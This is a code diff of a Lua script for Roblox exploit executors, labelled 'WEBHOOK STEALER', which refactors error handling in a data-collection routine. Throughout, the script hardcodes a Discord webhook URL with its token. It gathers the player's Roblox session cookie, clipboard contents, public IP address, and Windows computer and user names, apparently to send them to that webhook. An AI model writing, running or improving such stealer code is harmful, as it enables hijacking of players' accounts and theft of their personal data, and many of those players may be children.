@@ -1,17 +1,7 @@
 -- ============================================================
--- WEBHOOK STEALER – NO ERRORS, SAFE GETTERS
+-- WEBHOOK STEALER – NO RISKY PROPERTIES, FULL PCALL
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
-
--- ========== SAFE GETTER ==========
-local function safeGet(obj, prop, default)
-    local ok, val = pcall(function() return obj[prop] end)
-    if ok and val ~= nil then
-        return val
-    else
-        return default
-    end
-end
 
 -- ========== HTTP SENDER ==========
 local function sendMessage(content)
@@ -30,23 +20,40 @@ local function sendMessage(content)
     return false
 end
 
--- ========== COLLECT DATA (all reads wrapped in pcall) ==========
+-- ========== COLLECT DATA – ONLY SAFE READS ==========
 local function collectSnapshot()
     local player = game.Players.LocalPlayer
-    local info = {
-        executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown",
-        userId = player and tostring(player.UserId) or "N/A",
-        userName = player and player.Name or "N/A",
-        displayName = player and player.DisplayName or "N/A",
-        placeId = tostring(safeGet(game, "PlaceId", "N/A")),
-        jobId = safeGet(game, "JobId", "N/A"),
-        gameName = safeGet(game, "Name", "Unknown"),
-        placeVisits = tostring(safeGet(game, "PlaceVisitCount", "N/A")),
-        genres = safeGet(game, "Genres", "N/A"),
-        version = safeGet(game, "Version", "N/A"),
-    }
-
-    -- IP (safe)
+    local info = {}
+    
+    -- Executor (safe)
+    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
+    
+    -- Player info (always safe)
+    if player then
+        info.userId = tostring(player.UserId)
+        info.userName = player.Name
+        info.displayName = player.DisplayName
+    else
+        info.userId = "N/A"
+        info.userName = "N/A"
+        info.displayName = "N/A"
+    end
+    
+    -- Game info – each wrapped in pcall individually
+    local function getGameProp(prop, default)
+        local ok, val = pcall(function() return game[prop] end)
+        if ok and val ~= nil then
+            return tostring(val)
+        else
+            return default
+        end
+    end
+    info.placeId = getGameProp("PlaceId", "N/A")
+    info.jobId = getGameProp("JobId", "N/A")
+    info.gameName = getGameProp("Name", "Unknown")
+    info.version = getGameProp("Version", "N/A")
+    
+    -- IP (multiple fallbacks)
     local ip = "N/A"
     local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
     if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
@@ -59,59 +66,63 @@ local function collectSnapshot()
         if ok and res then ip = res:gsub("%s+", "") end
     end
     info.ip = ip
-
-    -- Cookie (safe)
+    
+    -- Cookie attempt (safe)
     local cookie = "Not available"
     ok, res = pcall(getcookie, "https://www.roblox.com/")
     if ok and res and res ~= "" then cookie = res end
     info.cookie = cookie
-
+    
     -- Clipboard (safe)
     local clip = "N/A"
     ok, res = pcall(getclipboard)
     if ok and res and res ~= "" then clip = res end
     info.clipboard = clip
-
-    -- Character (safe)
+    
+    -- Character stats (safe)
     pcall(function()
-        local char = player and player.Character
-        if char then
-            local hum = char:FindFirstChild("Humanoid")
-            if hum then
-                info.health = tostring(hum.Health)
-                info.maxHealth = tostring(hum.MaxHealth)
-                info.walkSpeed = tostring(hum.WalkSpeed)
-                info.jumpPower = tostring(hum.JumpPower)
+        if player then
+            local char = player.Character
+            if char then
+                local hum = char:FindFirstChild("Humanoid")
+                if hum then
+                    info.health = tostring(hum.Health)
+                    info.maxHealth = tostring(hum.MaxHealth)
+                    info.walkSpeed = tostring(hum.WalkSpeed)
+                    info.jumpPower = tostring(hum.JumpPower)
+                end
             end
         end
     end)
-
-    -- Ping & FPS (safe)
+    
+    -- Ping (safe)
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
     end)
+    
+    -- FPS (safe)
     pcall(function()
         local run = game:GetService("RunService")
         local ft = run.RenderStepTime
         if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
     end)
-
-    -- Hardware (safe)
+    
+    -- Platform & Graphics (safe)
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
     end)
-
-    -- System env (safe)
+    
+    -- System environment (safe)
     pcall(function()
         info.os = os.getenv("OS") or "N/A"
         info.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A"
         info.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A"
     end)
-
+    
     return info
 end
 
